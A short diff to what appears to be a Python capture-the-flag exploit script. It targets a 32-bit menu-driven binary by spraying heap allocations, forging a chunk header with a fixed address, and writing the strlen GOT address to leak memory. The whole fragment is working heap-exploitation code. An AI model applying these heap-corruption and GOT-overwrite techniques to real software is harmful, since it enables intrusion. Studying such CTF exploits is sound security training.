@@ -35,19 +35,22 @@ def sol():
     payload = p32(0)*9 + p32(0x1234)
     LEAVE_MSG(payload)
     #
-    for i in range(0,0x40):
+    for i in range(0,0x41):
         ADD("a","a")
-    ADD(p8(0x0)*27+p32(0x0804a2a8),"b")
-    #
 
     DEL()
     print "1.==========="
-    p.dump(0x804a250, 0x200)
+    p.heap(0x1400, 0x200)
     
-    ADD("c",p32(strlen_got))
+    ADD(p32(0)*8+"\x00"*3+p32(0x41)+p32(0x0804a2a0), "b")
     print "2.==========="
-    p.dump(0x804a250, 0x200)
+    p.heap(0x1400, 0x200)
 
+    p.dump(0x0804a2a0, 0x200)
+    ADD("c","d")
+    ADD("e"*4,p32(strlen_got))
+
+    p.dump(0x0804a2a0, 0x200)
 
     data = STATS()
     addr = data[data.rfind(":")+2:data.rfind(":")+6]
